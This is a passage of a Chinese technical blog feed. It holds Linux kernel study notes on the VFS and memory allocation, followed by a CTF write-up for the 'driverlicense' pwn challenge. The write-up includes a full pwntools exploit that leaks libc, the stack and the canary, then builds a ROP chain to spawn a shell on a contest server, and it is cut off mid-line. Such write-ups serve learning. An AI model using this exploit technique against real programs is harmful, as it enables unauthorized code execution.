d_delete()</li><li>file_operations, read() and write()</li></ul><p>操作对象作为一个结构体指针实现（类比IO_FILE)</p><p>除此之外：</p><ul><li>注册的文件系统用file_system_type结构体</li><li>安装点用vfsmount结构体</li><li>fs_struct</li><li>file</li></ul><h2 id="13-5-超级块对象"><a href="#13-5-超级块对象" class="headerlink" title="13.5 超级块对象"></a>13.5 超级块对象</h2><p>通常为磁盘超级快；对于内存文件系统，会现场创建超级块保存在内存</p><p>super_block结构体定义在文件&lt;linux/fs.h&gt;</p><h2 id="13-6-超级快操作"><a href="#13-6-超级快操作" class="headerlink" title="13.6 超级快操作"></a>13.6 超级快操作</h2><p>最重要的s_op，操作函数表，定义在文件&lt;linux/fs.h&gt;</p><p>文件系统需要执行超级快操作时，需要在超级快对象中，找需要的操作方法，如写自己的超级快：</p><pre><code>sb-&gt;s_op-&gt;write_super(sb);</code></pre><p>sb:super block指针，找op再找write</p><p>尽管函数来自超级快，调用时还是要把超级快作为参数传递</p><p>如果c++只需要</p><p>sb.write_super();</p><pre><code>//创建初始化新的索引节点struct inode* alloc_inode(struct super_block *sb)//释放给定的索引节点void destroy_inode(struct inode* inode)//索引节点脏时调用，日志文件系统执行函数，更新日志void dirty_inode(struct inode* inode)//索引节点写入磁盘，wait表示写操作是否需要同步void write_inode(struct inode *inode, int wait)//最后一个引用消失，VFS调用删除inodevoid drop_inode(struct inode *inode)void delete_inode(struct inode *inode)//卸载文件系统时释放超级快，调用者必须持有s_lockvoid put_super(struct super_block *sb)//用给定的超级快更新磁盘的超级快void write_super(struct super_block *sb)//文件系统的数据元与磁盘上的fs同步int sync_fs(struct super_block *sb, int wait)//禁止对文件系统改变，再用超级快更新磁盘超级快，LVM(逻辑卷标管理)使用void write_super_lockfs(struct super_block *sb)//重新安装文件系统int remount_fs(struct super_block *sb,int *flag, char* data)//释放inode+清空void clear_inode(struct inode *inode)//中断安装操作,网络文件系统如NFS使用void umount_begin(struct super_block *sb)</code></pre><p>除了dirty_inode都可以阻塞</p><p>如果操作函数指针为NULL，调用通用函数执行操作</p><h2 id="13-7-索引节点对象"><a href="#13-7-索引节点对象" class="headerlink" title="13.7 索引节点对象"></a>13.7 索引节点对象</h2><p>索引节点：内核操作文件或目录时需要的全部信息</p><p>Unix风格FS直接读取</p><p>其它需要提取inode相关信息</p><h2 id="13-8-索引节点操作"><a href="#13-8-索引节点操作" class="headerlink" title="13.8 索引节点操作"></a>13.8 索引节点操作</h2><p>调用方式</p><pre><code>i-&gt;i_op-&gt;truncate(i)</code></pre><p>这些函数可能VFS执行，也可能具体文件系统执行</p><pre><code>//为dentry创建新的索引节点，mode设置初始模式int create(struct inode*dir, struct dentry*dentry, int mode)//目录中寻找索引节点struct dentry loookup(struct inode *dir, struct dentry *dentry)//link()调用，创建硬连接int link(struct dentry *old_dentry, struct inode *dir, struct dentry *dentry)//unlink()调用，删除dentry指定的inodeint unlink(struct inode *dir, struct dentry *dentry)//symlink调用，创建软连接int unlink(struct inode *dir, struct dentry *dentry， const char *symname)//mknod调用，创建特殊文件。创建的文件放在dir，目录项dentry，关联的设备rdevint mknod(struct inode *dir, struct dentry *dentry, int mode, dev_t rdev)//readlink()调用，拷贝数据到特定的bufferint readlink(struct dentry *dentry, char *buffer, int buflen)//从符号链接查找索引节点，由dentry解析，结果存放在nd指向的nameidata结构体中int follow_link(struct dentry *dentry, struct nameidata *nd)//清除follow_linkint put_link(struct dentry *dentry, struct nameidata *nd)//修改文件的大小void truncate(struct inode* inode)//检查inode所代表的文件是否允许特定访问模式int permission(struct inode* inode, int mask)</code></pre><h2 id="13-9-目录项对象"><a href="#13-9-目录项对象" class="headerlink" title="13.9 目录项对象"></a>13.9 目录项对象</h2><p>每个dentry代表路径中的一个特定部分</p><p>常规的字符串比较，执行耗时，代码繁琐</p><p>目录项对象的引入使得过程更简单</p><h3 id="13-9-1-目录项状态"><a href="#13-9-1-目录项状态" class="headerlink" title="13.9.1 目录项状态"></a>13.9.1 目录项状态</h3><p>三种状态：被使用，未被使用和负状态</p><p>被使用：对应一个有效的索引节点，有一个多个使用者</p><p>被使用不能被丢弃</p><p>未被使用：d_count为0</p><p>负状态：没有对应节点（NULL），用于确认路径不存在</p><h3 id="13-9-2-目录项缓存"><a href="#13-9-2-目录项缓存" class="headerlink" title="13.9.2 目录项缓存"></a>13.9.2 目录项缓存</h3><p>将元素逐个解析为目录项，浪费时间</p><p>将目录项对象缓存在dcache中</p><p>三个主要部分：</p><p>被使用的目录项链表</p><p>最近被使用的双向链表：包含未被使用的，负状态的</p><p>散列表，相应的散列函数</p><p>散列表由数组dentry_hashtable表示， 元素为指向相同键值的目录项对象链表的指针</p><p>实际的散列值由d_hash函数计算：内核给FS唯一的散列函数</p><h2 id="13-10-目录项操作"><a href="#13-10-目录项操作" class="headerlink" title="13.10 目录项操作"></a>13.10 目录项操作</h2><pre><code>//比较文件名是否相同，对于FAT不区分大小写int d_compare(struct dentry *dentry, struct qstr *name1, struct qstr* name2)</code></pre><h2 id="13-11-文件对象"><a href="#13-11-文件对象" class="headerlink" title="13.11 文件对象"></a>13.11 文件对象</h2><p>文件对象在进程观点上，代表打开文件</p><p>OS视角上目录项对象代表打开文件，inode和目录项对象是唯一的</p><p>记录文件是否脏是索引节点记录的</p><h2 id="13-12-文件操作"><a href="#13-12-文件操作" class="headerlink" title="13.12 文件操作"></a>13.12 文件操作</h2><p>对不感兴趣的操作可置为NULL，通用操作</p><pre><code>//更新偏移量指针loff_t lleek(struct file *file, loff_t offset, int origin)//从offset读取count字节到buf，更新文件指针ssize_t read(struct file *file, char *buf, size_t count, loff_t offset)//从iocb描述的文件里，同步方式读取count字节到buf。ssize_t aio_read(struct kiocb *iocb, char *buf, size_t count, loff_t offset)//返回目录列表中的下一个目录int readdir(struct file *file, struct poll_table_struct *poll_table)//所有被缓存数据写回磁盘int fsync(struct file *file, struct dentry *dentry, int datasync)//打开或关闭异步IO的通告信号int fasync(int fd, struct file*file, int on)//从一个文件拷贝数据到另一个文件，全部在内核完成，避免了向用户不必要的拷贝ssize_t sendfile(struct file*file, loff_t *offset,size_t size, read_actor_t actor, void *target)//提供忠告锁int flock(struct file *flip, int cmd, struct file_lock *fl)</code></pre><h2 id="13-13-和文件系统相关的数据结构"><a href="#13-13-和文件系统相关的数据结构" class="headerlink" title="13.13 和文件系统相关的数据结构"></a>13.13 和文件系统相关的数据结构</h2><h4 id="file-system-type"><a href="#file-system-type" class="headerlink" title="file_system_type"></a>file_system_type</h4><p>描述各种FS类型</p><h4 id="vfsmount"><a href="#vfsmount" class="headerlink" title="vfsmount"></a>vfsmount</h4><p>描述一个FS的实例</p><p>理清文件系统和其它安装点的关系，是最复杂的工作</p><p>vsmount中的各种链表，用于跟踪相关信息</p><p>标准安装标志列表</p><table><thead><tr><th>标志</th><th>描述</th></tr></thead><tbody><tr><td>MNT_NOSUID</td><td>禁止exe设置setuid,setgid标志</td></tr><tr><td>MNT_MODEV</td><td>禁止访问该FS上的设备文件</td></tr><tr><td>MNT_NOEXEC</td><td>禁止执行FS上的exe</td></tr></tbody></table><h2 id="13-14-进程相关数据结构"><a href="#13-14-进程相关数据结构" class="headerlink" title="13.14 进程相关数据结构"></a>13.14 进程相关数据结构</h2><p>每个进程都有一组自己打开的文件</p><h4 id="files-struct"><a href="#files-struct" class="headerlink" title="files_struct"></a>files_struct</h4><pre><code>struct files_struct&#123;    atomic_t count;    ...    struct file *fd_array[NR_OPEN_DEFAULT];&#125;</code></pre><p>可容纳64个文件对象</p><p>若超过64，分配一个新数组</p><p>可以适当增大NR_OPEN_DEFAULT的预定义</p><p>count:可以让多个进程共享结构体，计数防止撤销</p><h4 id="fs-struct"><a href="#fs-struct" class="headerlink" title="fs_struct"></a>fs_struct</h4><p>包括文件系统和进程的相关信息</p><h4 id="mmt-namespace"><a href="#mmt-namespace" class="headerlink" title="mmt_namespace"></a>mmt_namespace</h4><p>单进程命名空间</p><p>每一个进程在系统中都看到为一个安装文件系统</p><p>默认情况，所有进程共享同样的命名空间</p><h2 id="13-15-小结"><a href="#13-15-小结" class="headerlink" title="13.15 小结"></a>13.15 小结</h2>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023925</title>
      <link href="/2023/09/25/2023-9-25/"/>
      <url>/2023/09/25/2023-9-25/</url>
      
        <content type="html"><![CDATA[<h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><h2 id="12-7"><a href="#12-7" class="headerlink" title="12.7"></a>12.7</h2><h3 id="12-7-1"><a href="#12-7-1" class="headerlink" title="12.7.1"></a>12.7.1</h3><p>中断栈</p><h3 id="12-7-2-栈上正大光明工作"><a href="#12-7-2-栈上正大光明工作" class="headerlink" title="12.7.2 栈上正大光明工作"></a>12.7.2 栈上正大光明工作</h3><p>尽量动态分配，内核栈有限</p><h2 id="12-8-高端内存的映射"><a href="#12-8-高端内存的映射" class="headerlink" title="12.8 高端内存的映射"></a>12.8 高端内存的映射</h2><h3 id="12-8-1-永久映射"><a href="#12-8-1-永久映射" class="headerlink" title="12.8.1 永久映射"></a>12.8.1 永久映射</h3><p>映射page到内核地址空间</p><pre><code>void *kmap(struct page *page)</code></pre><p>低端内存：返回虚拟地址</p><p>高端内存：建立永久映射，并返回地址</p><p>kmap可睡眠</p><p>永久映射有限，高端内存不需要时候应该解除映射</p><pre><code>void kunmap(struct page *page)</code></pre><h3 id="12-8-2-临时映射（原子映射）"><a href="#12-8-2-临时映射（原子映射）" class="headerlink" title="12.8.2 临时映射（原子映射）"></a>12.8.2 临时映射（原子映射）</h3><p>创建映射且上下文不能睡眠</p><pre><code>void *kmap_atomic(struct page*page, enum km_type type)</code></pre><p>type描述了临时映射的目的</p><p>不会阻塞</p><p>禁止内核抢占，每个映射对每个处理器唯一</p><pre><code>void kunmap_atomic(void *kvaddr, enum_type type)</code></pre><h2 id="12-9-每个CPU的分配"><a href="#12-9-每个CPU的分配" class="headerlink" title="12.9 每个CPU的分配"></a>12.9 每个CPU的分配</h2><p>每个CPU的数据存在一个数组里</p><p>按当前处理器号决定这个数组的当前元素</p><pre><code>unsigned long my_percpu[NR_CPUS];int cpu;cpu = get_cpu();my_percpu[cpu]++; //具体执行的代码put_cpu();</code></pre><p>不存在并发问题</p><p>内核抢占问题：</p><ul><li>代码被其它处理器抢占，重新调度，CPU变量无效</li><li>同一个处理器抢占了两个，造成竞争</li></ul><p>get_cpu()时禁止内核抢占，put_cpu()时重新激活处理器</p><h2 id="12-10-新的每个CPU接口"><a href="#12-10-新的每个CPU接口" class="headerlink" title="12.10 新的每个CPU接口"></a>12.10 新的每个CPU接口</h2><p>2.6内核为了方便操作每个CPU数据，引入percpu</p><p>&lt;linux/percpu.h&gt;声明了所有接口操作例程</p><h3 id="12-10-1-编译时每个CPU数据"><a href="#12-10-1-编译时每个CPU数据" class="headerlink" title="12.10.1 编译时每个CPU数据"></a>12.10.1 编译时每个CPU数据</h3><pre><code>DEFINE_PER_CPU(type, name);</code></pre><p>为每个处理器创建类型为type，名字为name的变量实例</p><p>在别处声明变量：</p><pre><code>DECLARE_PER_CPU(type, name);</code></pre><p>get_cpu, put_cpu操作变量</p><pre><code>get_cpu_var(name)++;put_cpu_var(name);</code></pre><p>也可以</p><pre><code>per_cpu(name, cpu)++;</code></pre><p>此方法不会禁止内核抢占，也不会提供锁保护</p><p>链接程序将他们创捷在一个唯一的可执行段中.data.percpu</p><h3 id="12-10-2-运行时的每个CPU数据"><a href="#12-10-2-运行时的每个CPU数据" class="headerlink" title="12.10.2 运行时的每个CPU数据"></a>12.10.2 运行时的每个CPU数据</h3><p>内核实现CPU数据动态分配类似kmalloc</p><pre><code>void *alloc_percpu(type);void *__alloc_percpu(size_t size, size_t align);void free_percpu(const void *);</code></pre><p>alloc_percpu:单字节对齐，按照给定类型的自然边界对齐</p><p>__alloc_percpu:指定对齐</p><p>返回一个指针，用来引用CPU数据</p><pre><code>get_cpu_var(ptr);put_cpu_var(prt);</code></pre><h2 id="12-11-使用每个CPU数据的原因"><a href="#12-11-使用每个CPU数据的原因" class="headerlink" title="12.11 使用每个CPU数据的原因"></a>12.11 使用每个CPU数据的原因</h2><ol><li>减少了数据锁定，不再需要锁（纯粹的编程约定，不存在强制措施）</li><li>大大减少缓存失效,percpu接口缓存对齐（cache align）所有数据</li></ol><p>唯一的安全要求：禁止内核抢占（put, get)，不能睡眠</p><h2 id="12-12-分配函数的选择"><a href="#12-12-分配函数的选择" class="headerlink" title="12.12 分配函数的选择"></a>12.12 分配函数的选择</h2><ul><li>常用：kmalloc() GFP_ATOMIC 或 GFP_KERNEL</li><li>高端内存：alloc_pages()+kmap()</li><li>vmalloc():分配大段内存</li><li>slab：针对创建撤销很多大的数据结构</li></ul><h2 id="12-13-小结"><a href="#12-13-小结" class="headerlink" title="12.13 小结"></a>12.13 小结</h2>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023921</title>
      <link href="/2023/09/21/2023-9-21/"/>
      <url>/2023/09/21/2023-9-21/</url>
      
        <content type="html"><![CDATA[<h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><p>linux内核设计与实现第12章笔记</p><h2 id="1-页"><a href="#1-页" class="headerlink" title="1.页"></a>1.页</h2><h2 id="2-区"><a href="#2-区" class="headerlink" title="2.区"></a>2.区</h2><p>对相似特性的页分组</p><p>目的：某些硬件存在缺陷，无法寻址</p><ul><li>只能用特定内存DMA</li><li>物理寻址范围大于虚拟寻址范围</li></ul><p>四种区</p><ul><li>ZONE_DMA</li><li>ZONE_DMA32</li><li>ZONE_NORMAL</li><li>ZONE_HIGHEM：高端内存，页不能永久映射到内核地址</li></ul><p>不一定要定义所有区</p><h2 id="3-获得页"><a href="#3-获得页" class="headerlink" title="3.获得页"></a>3.获得页</h2><p>底层接口&lt;linux/gfp.h&gt;，函数：</p><p>struct pages *alloc_pages(gfp_mask, order)</p><p>分配1&lt;&lt;order个连续的物理页，返回第一个页的struct结构体</p><p>void * page_address(struct page *page)</p><p>返回指针，指向给定物理页的逻辑地址</p><p>unsigned long __get_free_pages(fgp_mask, order)</p><p>与alloc_pages一样，返回第一个页的逻辑地址</p><h2 id="获得填充为0的页"><a href="#获得填充为0的页" class="headerlink" title="获得填充为0的页"></a>获得填充为0的页</h2><p>unsigned long get_zeroed_page(gfp_mask)</p><h2 id="释放页"><a href="#释放页" class="headerlink" title="释放页"></a>释放页</h2><p>8个页的使用与释放</p><pre class=" language-c"><code class="language-c">page <span class="token operator">=</span> <span class="token function">__get_free_pages</span><span class="token punctuation">(</span>GFP_KERNEL<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>page<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* page指向逻辑地址 */</span><span class="token function">free_pages</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="4-kmalloc"><a href="#4-kmalloc" class="headerlink" title="4.kmalloc"></a>4.kmalloc</h2><p>void *kmalloc(size_t size, gfp_t flags)</p><p>分配的内存区，物理上连续</p><p>如果是NULL，需要处理错误</p><p>调用成功，返回逻辑地址，内存块的大小至少为请求的大小</p><h2 id="gfp-mask标志"><a href="#gfp-mask标志" class="headerlink" title="gfp_mask标志"></a>gfp_mask标志</h2><p>分为行为修饰符，区修饰符及类型</p><ol><li><p>行为修饰符</p><p>描述分配器的具体特征</p><p>例子</p><pre><code>ptr = kmalloc(size, __GFP_WAIT|__GFP_IO|__GFP_FS);</code></pre><p>可以阻塞，执行IO，必要时可以执行FS操作</p></li><li><p>区修饰符</p><p>默认从ZONE_NORMAL分配</p><p>不能给get_free_pages(),kmalloc()指定ZONE_HIGHMEM，因为不能返回固定的逻辑地址</p></li><li><p>类型标志</p><p>指定所需的行为和区描述符（多个的复合）</p><table><thead><tr><th>标志</th><th>修饰符标志</th></tr></thead><tbody><tr><td>GFP_KERNEL</td><td>(__GFP_WAIT|__GFP_IO|__GFP_FS)</td></tr><tr><td>GFP_ATOMIC</td><td>__GFP_HIGH</td></tr><tr><td>GFP_NOIO</td><td>__GFP_WAIT</td></tr><tr><td>GFP_NOFS</td><td>__GFP_WAIT|__GFP_IO</td></tr></tbody></table><p>GFP_KERNEL:可能睡眠，普通优先级,最常用</p><p>可以用在可以重新安全调度的进程context</p><p>GFP_ATOMIC: 不能干任何事，分配成功机会较小，适用于不能睡眠的情况（中断处理程序，软中断,tasklet）</p><p>GFP_NOFS:用在FS代码中，如果没有用GFP_NOFS，会引起更多的文件系统操作，形成套娃，最后死锁</p><p><strong>绝大多数代码中，要么GFP_KERNEL,要么GFP_ATOMIC</strong></p></li></ol><h2 id="kfree"><a href="#kfree" class="headerlink" title="kfree()"></a>kfree()</h2><h2 id="5-vmalloc"><a href="#5-vmalloc" class="headerlink" title="5.vmalloc()"></a>5.vmalloc()</h2><p>类似kmalloc()，前者的虚拟地址连续，物理地址不需要连续</p><p>大多数情况，只有硬件设备需要物理地址连续的设备</p><p>kmalloc有更好的性能，因此vmalloc不得已才会使用-》获得大段内存</p><p>例如模块被动态插入到内核中</p><p>用法与用户空间一样：void *vmalloc(unsigned long size)</p><p>void vfree(const void*addr)</p><p>这个函数可以睡眠，没有返回值</p><h2 id="6-slab层"><a href="#6-slab层" class="headerlink" title="6.slab层"></a>6.slab层</h2><p>空闲链表：相当于对象高速缓存</p><p>slab扮演通用数据结构缓存层的角色</p><h3 id="设计思想"><a href="#设计思想" class="headerlink" title="设计思想"></a>设计思想</h3><p>不同的对象划分为高速缓存组，每种对象对应一个高速缓存</p><p>kmalloc建立在slab层上，使用一组cache</p><p>slab：一个多个物理上连续的页组成，一般情况下仅仅一页</p><p>把用的，不用的对象组织起来</p><p>例子：inode用slab管理, struct inode用inode_cachep高速缓存</p><p>每个高速缓存用kmem_cache结构表示，包含三个链表：slabs_full,partial,empty</p><p>每个slab用slab描述符 struct slab表示</p><pre><code>struct slab &#123;    struct list_head list;    unsigned long colouroff; //着色的偏移量    void *s_mem; //第一个对象    unsigned inuse; //已分配的对象    kmem_bufctl_t free; //第一个空闲对象&#125;;</code></pre><p>slab描述符：要么在slab外另行分配，要么在slab自身开始的地方。</p><p>slab为高速缓存创建新的slab，通过__get_free_pages()</p><pre><code>void *kmem_getpages(struct kmem_cahce *cachep, gfp_t flags, int nodeid)</code></pre><p>nodeid:用于NUMA系统，提供较好性能</p><p>返回一个slab大小的空页</p><p>slab层的管理：在每个高速缓存的基础上，给整个内核一个简单的接口完成</p><p>通过接口，创建撤销新的高速缓存</p><h3 id="slab分配器的接口"><a href="#slab分配器的接口" class="headerlink" title="slab分配器的接口"></a>slab分配器的接口</h3><p>高速缓存的创建</p><pre><code>struct kmem_cache * kmem_cache_create(const char *name, size_t size, size_t align, unsigned long flags, void (*ctor) (void*));</code></pre><p>flags:</p><ul><li>SLAB_HWCACHE_ALIGN:所有对象，行对齐，防止错误的共享</li><li>SLAB_POISON:用a5a5a5a5填充slab</li><li>SLAB_RED_ZONE：红色警戒区，检测缓冲越界</li><li>SLAB_CACHE_DMA：用于DMA</li></ul><p>ctor:构造函数，linux不需要</p><p>不能在中断context中使用-&gt;可能睡眠</p><p>高速缓存的撤销</p><pre><code>int kmem_cache_destroy(struct kmem_cache *cachep)</code></pre><p>调用条件：</p><ul><li><p>所有slab为空，不能被分配</p></li><li><p>调用destroy过程中不再访问这个高速缓存</p></li></ul><h3 id="1-从缓存中分配"><a href="#1-从缓存中分配" class="headerlink" title="1.从缓存中分配"></a>1.从缓存中分配</h3><p>创建cachep后可从下面函数获取对象：</p><pre><code>void * kmem_cache_alloc(struct kmem_cache *cachep, gfp_t flags)</code></pre><p>从指定的cachep获得一个指向对象的指针</p><p>flags:针对cachep没有空闲对象时， getpages的情况</p><p>释放对象</p><pre><code>void * kmem_cache_free(struct kmem_cache *cachep, void *objp)</code></pre><h3 id="2-task-struct使用实例"><a href="#2-task-struct使用实例" class="headerlink" title="2.task_struct使用实例"></a>2.task_struct使用实例</h3>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023铁人三项决赛</title>
      <link href="/2023/04/28/2023%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%86%B3%E8%B5%9B/"/>
      <url>/2023/04/28/2023%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>铁三决赛pwn的难度不大，但是那道虚拟机漏洞类型还是挺新颖的，以后有空可以整理一下不同类型虚拟机漏洞的利用</p><p>值得吐槽的是，我们实训课xjb装东西，竟然把我kali的pwntools和pwndbg全搞没了，比赛前半小时才发现（别问我为什么这么久没碰pwn)，害得我把kali恢复到了去年8月的快照</p><h1 id="driverlicense"><a href="#driverlicense" class="headerlink" title="driverlicense"></a>driverlicense</h1><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>可以输入驾照的name, year, comment, name和comment以string形式存在栈上，year为数字</p><p>后面可以修改comment，并show驾照的信息</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>edit comment的过程中，我们会获得comment string的cstr指针，然后用malloc_usable_size的方式获得当前长度，这个长度用于后续的输出</p><p>但是cstr在字符串长的时候才是堆指针，<strong>字符串较短的时候会保存在栈上，此时malloc_usable_size不适用这种情况</strong>，我们可以获得一个很大的size</p><p><img src="1.png" alt="get usable size"></p><p>由于此时字符串在栈上，我们初步构思这是一个栈溢出</p><p>接下来问题来了，怎么泄露libc和canary?</p><p>出题者故意把name string放在了comment string后，我们就可以通过溢出控制name的cstr,由于没开pie，我们直接把cstr换成read的got地址，就泄露了libc</p><p>如法炮制，有了libc就有了envrion，就可以通过偏移推测栈上的canary地址，泄露出来</p><h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = process('./pwn')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'172.31.3.108'</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'comment'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'year'</span><span class="token punctuation">,</span> <span class="token string">'12'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'comment'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io, 'b *0x401137')</span>payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x602028</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name : '</span><span class="token punctuation">)</span>leak_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span> b<span class="token string">'\0\0'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_libc'</span><span class="token punctuation">,</span> leak_libc<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_libc <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#leak stack </span>environ <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name : '</span><span class="token punctuation">)</span>leak_stack <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span> b<span class="token string">'\0\0'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_stack'</span><span class="token punctuation">,</span> leak_stack<span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> leak_stack <span class="token operator">+</span> <span class="token number">0x7fffaca833c8</span> <span class="token operator">-</span> <span class="token number">0x7fffaca834d8</span><span class="token comment" spellcheck="true">#leak canary</span>payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name : '</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'canary'</span><span class="token punctuation">,</span> canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40155d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> b<span class="token string">'b'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x401713</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" 